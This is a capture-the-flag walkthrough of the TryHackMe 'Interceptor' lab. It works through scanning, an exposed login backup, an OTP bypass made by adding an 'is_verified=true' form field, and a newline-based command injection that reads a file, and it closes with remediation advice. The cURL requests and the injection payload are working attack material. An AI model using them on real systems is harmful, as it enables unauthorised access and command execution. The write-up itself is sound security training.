# Interceptor Challenge

*[Image: Banner]*

**Pathway:** *Jr Penetration Tester* | **Section:** *Jr Pentester Challenges* | **Challenge:** *[Interceptor](https://tryhackme.com/room/interceptor)*

> [!IMPORTANT]
>
> **Working write-up notice:** This was a working and verified write-up at the time of writing on **16 July 2026**.
>
> **Spoiler warning:** This write-up documents the exploitation chain, although credentials, exact challenge-specific values and flag codes are not shown.
>
> **Please note:** The IP addresses used during the lab were dynamically allocated by TryHackMe. The attack was performed from my own Kali Linux VM using OpenVPN to connect to the TryHackMe VPN.
>
> The following placeholders are used throughout:
>
>: `<TARGET_IP>` represents the IP address allocated to the target machine.
>: `<TUN0_IP>` represents the IP address assigned to the Kali Linux `tun0` interface.
>: `<REDACTED>` represents credentials, sensitive values, exact challenge answers or other material that would directly give away the room.
>: `THM{....}` represents a redacted TryHackMe flag.
>
> **Licence:** Unless otherwise stated, all write-ups and documentation in this repository are licensed under [CC BY 4.0](https://creativecommons.org/licenses/by/4.0/).
>
> Any original scripts or code snippets are provided under the [MIT Licence](https://opensource.org/license/mit/).

## About TryHackMe

This write-up was made possible by the hard work of the TryHackMe team and the wider cyber security community, who continue to create practical and engaging learning environments for aspiring security professionals.

[TryHackMe](https://tryhackme.com/) is an online cyber security training platform that provides hands-on labs covering penetration testing, networking, web application security, privilege escalation and defensive security. Its rooms allow learners to develop practical technical skills within controlled and authorised environments.

## Lab Summary

Interceptor is a web-application challenge built around a fictional internal media portal named MediaHub. The room focuses on understanding how a browser communicates with backend endpoints and how an attacker can alter HTTP requests and responses with Burp Suite.

The successful attack chain involved:

1. Confirming VPN connectivity, routing and local hostname resolution.
2. Enumerating the exposed SSH, DNS and HTTP services.
3. Discovering web application files, including an exposed backup copy of the login page.
4. Recovering the administrative email address and password format from the backup.
5. Logging in and reaching the two-factor authentication page.
6. Intercepting the OTP request with Burp Suite.
7. Adding a client-controlled verification parameter to the multipart request.
8. Observing and modifying the JSON response returned to the browser.
9. Reproducing the request-side bypass with cURL and a persistent session cookie.
10. Accessing the administrative dashboard and obtaining the first redacted flag.
11. Identifying a feed-import function that executed a system command.
12. Bypassing weak character filtering with a literal newline.
13. Reading `/var/www/user.txt` and obtaining the second redacted flag.

Confirmed lab details used during the walkthrough:

```text
Target IP: <TARGET_IP>
Kali tun0 IP: <TUN0_IP>
Attacker working directory: /tmp/VK/
Local hostname: interceptor.thm
```

The hostname was added to the Kali VM's local hosts file:

```bash
echo "<TARGET_IP> interceptor.thm" | sudo tee -a /etc/hosts
```

The mapping was confirmed with:

```bash
getent hosts interceptor.thm
```

VPN routing and the tunnel address were also verified:

```bash
ip route get <TARGET_IP>
ip -br address show tun0
```

The expected route showed traffic leaving through `tun0` and using `<TUN0_IP>` as the source address:

```text
<TARGET_IP> via <REDACTED> dev tun0 src <TUN0_IP>
```

This confirmed that traffic to the target was routed through `tun0` using `<TUN0_IP>`.

> [!TIP]
>
> When using your own Kali Linux VM, the `/etc/hosts` file is especially important in TryHackMe challenges. Many rooms depend on hostname-based routing, virtual hosts, redirects, cookies or application logic that may not work correctly when the expected hostname is missing.
>
> Over time, `/etc/hosts` can become cluttered with entries from previous rooms. It is advantageous to keep the file clear, tidy and focused on the challenge currently being worked on.
>
> A neglected hosts file eventually becomes DNS spaghetti: technically functional, but not something anybody should be proud of.

The file can be reviewed with:

```bash
cat /etc/hosts
```

An old entry for this room can be removed with:

```bash
sudo sed -i '/interceptor\.thm/d' /etc/hosts
```

The correct mapping can then be added again using the currently allocated `<TARGET_IP>`.

## Tools Used

The principal tools and utilities used during the challenge were:

- `ip` for confirming VPN routing and the `tun0` address.
- `getent` and `ping` for validating hostname resolution and connectivity.
- `rustscan` and `nmap` for TCP port and service enumeration.
- `dirsearch` and `feroxbuster` for web content discovery.
- `dig` for basic DNS testing.
- Firefox for interacting with the MediaHub application.
- Burp Suite for intercepting and modifying HTTP traffic.
- cURL for reproducing requests, maintaining cookies and testing the vulnerable endpoints.
- `cat`, `ls` and other standard Linux utilities for local file and output inspection.

Click [HERE](https://github.com/Valikahn/TryHackMe-Jr-Penetration-Tester#tools-commonly-used) to return to the repository README.

The `Tools Commonly Used` section contains links to tools used throughout the pathway.

## Initial Enumeration

### Port and Service Discovery

An initial Nmap scan was performed:

```bash
nmap -sC -sV -Pn -oN nmap_output.txt interceptor.thm
```

A rapid RustScan scan was also used to confirm the same exposed services:

```bash
rustscan -b 500 -a interceptor.thm --top -- -sC -sV -Pn
```

The principal findings were:

```text
22/tcp open  ssh
53/tcp open  domain
80/tcp open  http
```

Service detection identified:

```text
SSH: OpenSSH on Ubuntu
DNS: ISC BIND
HTTP: Apache on Ubuntu
```

The HTTP title was:

```text
MediaHub
```

The web service also issued a `PHPSESSID` cookie, confirming that the application used PHP sessions.

### DNS Review

The target's DNS service was queried directly:

```bash
dig @<TARGET_IP> interceptor.thm
```

The server refused recursive resolution.

A zone-transfer attempt was also made:

```bash
dig -t AXFR interceptor.thm @<TARGET_IP>
```

The transfer failed, so DNS did not provide a useful path forward.

### Web Content Discovery

Dirsearch was used against the web root:

```bash
dirsearch -u http://interceptor.thm/
```

Feroxbuster was then used with common web extensions:

```bash
feroxbuster \
-u http://interceptor.thm/ \
--dont-scan http://interceptor.thm/phpmyadmin \
-w /usr/share/wordlists/dirb/big.txt \
-x php,txt,html,py,php.bak,php~ \
-t 50 \
-k \
-C 404 \
--redirects
```

Notable findings included:

```text
/assets/
/uploads/
/config.php
/dashboard.php
/login.php
/api_login.php
/search.php
/phpmyadmin/
```

The most important discovery was:

```text
/login.php.bak
```

The backup file was accessible directly and contained the original PHP source comments.

### Reviewing the Exposed Login Backup

The backup was retrieved with:

```bash
curl -s http://interceptor.thm/login.php.bak
```

The source code disclosed:

```text
Administrative email: <REDACTED>
Password format: <REDACTED>
```

This was a serious information-disclosure issue because it revealed enough information to authenticate as the administrative user.

The live login page also showed that credentials were submitted asynchronously to:

```text
/api_login.php
```

Successful authentication redirected the browser to:

```text
/otp.php
```

The OTP form submitted a six-digit value to:

```text
/verify_otp.php
```

## Exploits

### Administrative Login

The exposed credentials were submitted through the browser:

```text
Email: <REDACTED>
Password: <REDACTED>
```

The application accepted the credentials but required a six-digit one-time password before granting access to the dashboard.

A test value was entered into the OTP form:

```text
<REDACTED>
```

The important objective was not to guess the correct OTP, but to inspect and manipulate the request sent by the browser.

### Burp Suite OTP Request Interception

Burp Suite was launched and its default proxy listener was confirmed:

```text
127.0.0.1:8080
```

The application was opened using Burp's built-in browser. After logging in and reaching the OTP page, interception was enabled before pressing **Verify**.

Burp captured:

```http
POST /verify_otp.php HTTP/1.1
Host: interceptor.thm
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary<REDACTED>
Cookie: PHPSESSID=<REDACTED>
```

The original multipart body contained only the OTP field:

```http
------WebKitFormBoundary<REDACTED>
Content-Disposition: form-data; name="otp"

<REDACTED>
------WebKitFormBoundary<REDACTED>--
```

A second form field was added before the final terminating boundary:

```http
------WebKitFormBoundary<REDACTED>
Content-Disposition: form-data; name="otp"

<REDACTED>
------WebKitFormBoundary<REDACTED>
Content-Disposition: form-data; name="is_verified"

true
------WebKitFormBoundary<REDACTED>--
```

> [!IMPORTANT]
>
> The boundary string must remain identical throughout the request. Only the final boundary should end with `--`.
>
> Placing another field after a terminating boundary creates a malformed multipart request and may cause the added field to be ignored.

This request demonstrated a mass-assignment or client-controlled state weakness. The server accepted a verification-related field supplied by the client instead of deriving the verification state exclusively from a valid server-side OTP check.

### Intercepting the JSON Response

Burp was configured to intercept the response to the OTP request:

1. Right-click inside the intercepted request.
2. Select **Do intercept**.
3. Select **Response to this request**.
4. Forward the request once.

The server returned JSON similar to:

```json
{
  "ok": false,
  "error": "Invalid OTP. Try again.",
  "is_verified": false
}
```

For demonstration purposes, the browser-facing response was changed to:

```json
{
  "ok": true,
  "message": "OTP verified successfully.",
  "is_verified": true
}
```

The modified response caused the client-side JavaScript to display a successful verification message and request:

```text
/dashboard.php
```

However, modifying a response alone only changes what the browser sees. It does not necessarily update the server-side session. The reliable bypass was therefore the request-side injection of the verification parameter.

### Reproducing the Authentication Bypass with cURL

The attack was reproduced cleanly from Kali Linux using a cookie jar.

First, an administrative session was created:

```bash
curl -s \
-c admin.cookies \
-X POST http://interceptor.thm/api_login.php \
-F 'email=<REDACTED>' \
-F 'password=<REDACTED>'
```

The application confirmed that the credentials were valid and that OTP verification was required.

The client-controlled verification field was then submitted directly:

```bash
curl -s \
-b admin.cookies \
-c admin.cookies \
-X POST http://interceptor.thm/verify_otp.php \
-F 'is_verified=true'
```

The server accepted the supplied verification state and updated the PHP session.

The protected dashboard was then requested with the same cookie:

```bash
curl -s \
-b admin.cookies \
http://interceptor.thm/dashboard.php
```

The returned HTML confirmed:

```text
Role: admin
Verified: Yes
Flag: THM{....}
```

This completed the first objective.

### Feed Import Function

The administrative dashboard included an **Import Feed** feature. The browser submitted a user-controlled URL to:

```text
/import_feed_api.php
```

The JavaScript attempted to remove several shell metacharacters:

```javascript
const url = url1.replace(/[;&|]/g, '');
```

This was only a browser-side control and could be bypassed by sending requests directly.

A harmless localhost request was tested first:

```bash
curl -s \
-b admin.cookies \
-X POST http://interceptor.thm/import_feed_api.php \
-F 'url=http://127.0.0.1/'
```

The response was:

```json
{"ok":false,"error":"Private network access blocked"}
```

This showed that the application attempted to restrict private-network destinations.

### Command Injection Testing

A semicolon-separated payload was attempted:

```bash
curl -s \
-b admin.cookies \
-X POST http://interceptor.thm/import_feed_api.php \
-F 'url=https://example.com;cat /var/www/user.txt'
```

The semicolon was neutralised and only the intended network request ran.

The application was then tested with a literal newline as the command separator:

```bash
curl -s \
-b admin.cookies \
-X POST http://interceptor.thm/import_feed_api.php \
-F $'url=https://example.com\ncat /var/www/user.txt'
```

Bash's `$'...'` quoting inserted an actual newline into the submitted form value. When the vulnerable application passed the value to a shell, the newline separated the intended command from:

```bash
cat /var/www/user.txt
```

The server returned:

```json
{
  "ok": true,
  "message": "Feed fetched successfully",
  "cmd_output": "THM{....}\n"
}
```

This completed the second objective.

## Full Attack Chain Recap

### 1. VPN and Hostname Preparation

The target address and `tun0` address were confirmed. The room hostname was mapped to `<TARGET_IP>` in `/etc/hosts`, ensuring that Apache, cookies and the PHP application were accessed through the expected hostname.

### 2. Service Discovery

RustScan and Nmap identified SSH, DNS and HTTP services. Apache hosted the MediaHub application on port 80.

### 3. Web Enumeration

Dirsearch and Feroxbuster identified the login endpoint, API routes, protected dashboard, upload directory and an exposed backup copy of the login page.

### 4. Source-Code Disclosure

`login.php.bak` contained comments that disclosed the administrative account and password format. The exact values are redacted from this public write-up.

### 5. Administrative Authentication

The recovered information was used to pass the primary login stage. The application then required a six-digit OTP.

### 6. OTP Request Interception

Burp Suite captured the multipart request sent to `/verify_otp.php`. A second form field was inserted into the body while preserving the original WebKit boundary.

### 7. Client-Controlled Verification State

The added `is_verified=true` field was accepted by the server. This exposed a trust-boundary failure in which the client could influence an authentication decision that should have been controlled only by server-side logic.

### 8. Response Manipulation

The OTP JSON response was intercepted and modified to demonstrate that the browser trusted client-visible fields such as `ok` and `is_verified`. This changed the front-end behaviour but was not, by itself, sufficient to prove server-side authentication.

### 9. Server-Side Session Bypass

The request-side flaw was reproduced with cURL. A persistent PHP session cookie was created, the verification parameter was submitted and the session became authenticated.

### 10. Administrative Dashboard Access

The dashboard was retrieved with the updated cookie and displayed the first redacted flag:

```text
THM{....}
```

### 11. Feed Import Analysis

The dashboard exposed a feed-import function that passed user-controlled input into a system command and returned the resulting command output.

### 12. Newline Command Injection

Although the application filtered `;`, `&` and `|`, it did not reject newline characters. A literal newline separated the intended URL-fetching command from a second shell command.

### 13. Final Objective

The injected command read `/var/www/user.txt`, returning the second redacted flag:

```text
THM{....}
```

## Key Lessons

Interceptor demonstrated several useful penetration-testing and defensive-security lessons:

- Confirm VPN routing and hostname resolution before troubleshooting higher-level application behaviour.
- Keep `/etc/hosts` tidy when using a personal Kali Linux VM for TryHackMe rooms.
- Backup files such as `.bak` copies can disclose source code, comments, credentials and implementation assumptions.
- Client-side validation is not a security boundary because requests can be modified or recreated outside the browser.
- Authentication state must never be accepted directly from client-controlled fields.
- Burp Suite can intercept both requests and responses, but the security impact of each must be understood separately.
- Modifying a response may fool browser-side logic without changing the server-side session.
- Multipart form boundaries must be preserved exactly when manually editing request bodies.
- Persistent cookie jars make cURL useful for reproducing stateful web-application attacks.
- Blacklisting a handful of shell metacharacters is not a reliable defence against command injection.
- Newline characters can act as shell command separators.
- URL allow-lists and private-network checks do not address command injection when the input is passed to a shell.
- Returning raw command output to the browser significantly increases the impact of command-execution flaws.
- A successful exploit should be verified at the server side rather than inferred only from a front-end message.
- Public write-ups should explain the method while withholding live credentials, exact flags and unnecessary challenge giveaways.

The most important lesson was that the room involved two different trust failures. The OTP flow trusted a client-supplied authentication value, while the feed importer trusted user input inside a shell command. In both cases, controls implemented in the browser did not protect the backend.

## Remediation Notes

### Backup and Source-Code Protection

- Remove backup, temporary and editor-generated files from the production web root.
- Configure the deployment process to exclude `.bak`, `.old`, `.swp`, `~` and similar files.
- Deny access to backup extensions at the web-server level.
- Never store credentials, password formats or sensitive operational notes in source-code comments.
- Add automated secret scanning to the development and deployment pipeline.
- Rotate credentials immediately if they are exposed in a public or web-accessible file.

### Authentication and OTP Security

- Generate, store and validate OTPs entirely on the server.
- Do not accept fields such as `verified`, `is_verified`, `role` or `authenticated` from untrusted clients.
- Maintain authentication state exclusively in the server-side session.
- Bind the OTP challenge to the correct user, session and expiry time.
- Apply rate limiting and attempt counters to OTP verification.
- Invalidate OTPs after successful use.
- Regenerate the session identifier after authentication and privilege changes.
- Require server-side authorisation checks on every protected route.
- Avoid returning unnecessary internal authentication-state fields in JSON responses.
- Log and alert on malformed OTP requests or unexpected verification parameters.

### Request and Response Handling

- Treat browser-side JavaScript as a usability feature, not a security control.
- Validate all inputs again on the server.
- Reject unexpected form fields by using an explicit request schema.
- Use strict content-type and parameter validation.
- Avoid exposing detailed authentication errors that assist attackers.
- Ensure front-end redirects are backed by independent server-side access checks.

### Command Injection Prevention

- Do not construct shell commands from user-supplied URLs.
- Use a native HTTP client library rather than invoking `curl` through a shell.
- If a system command is unavoidable, pass arguments as a fixed array without shell interpretation.
- Avoid functions or options that invoke `/bin/sh -c`.
- Apply a strict allow-list for URL schemes, hostnames, ports and characters.
- Reject control characters, including carriage returns and newlines.
- Resolve and validate destination addresses before connecting.
- Revalidate every redirect destination.
- Block loopback, private, link-local and reserved address ranges.
- Apply outbound network restrictions to the web service.
- Return only the minimum data required by the user interface.
- Do not expose raw stderr or command output to the client.

### Web Server and Session Hardening

- Set PHP session cookies with `HttpOnly`, `Secure` and an appropriate `SameSite` policy.
- Use HTTPS for authentication and session traffic.
- Disable directory listing unless there is a documented requirement.
- Restrict administrative interfaces and database-management tools.
- Remove unused services and development components from the production host.
- Apply current security updates to Apache, PHP and the operating system.
- Monitor requests to sensitive endpoints such as login, OTP and import functions.

### Operational Hygiene

- Keep `/etc/hosts` limited to active lab mappings.
- Remove stale challenge entries after each room.
- Maintain a separate working directory for each engagement.
- Save scan output and relevant HTTP evidence.
- Confirm the target and `tun0` addresses before running commands.
- Validate each stage of an attack chain before moving to the next.

## Disclaimer

This write-up is intended solely for education, training and documentation of an authorised TryHackMe lab.

All tools, commands, payloads and post-exploitation techniques described here were used within a controlled environment provided by TryHackMe. Permission to interact with the target was granted by the platform owner and operator as part of the room.

The tools and methods documented in this walkthrough represent one successful approach. They are not the only possible techniques, and alternative tools or workflows may produce the same result.

Never test, scan, exploit or access a system without clear and explicit authorisation from its owner.

---
[!["Buy Me A Coffee"](https://www.buymeacoffee.com/assets/img/custom_images/orange_img.png)](https://buymeacoffee.com/v4l1k4hn)  

**Powered on ☕ made with ❤️ by [V4L1K4HN](https://tryhackme.com/p/V4L1K4HN)**  
⭐ If this project is useful, consider starring it on GitHub.
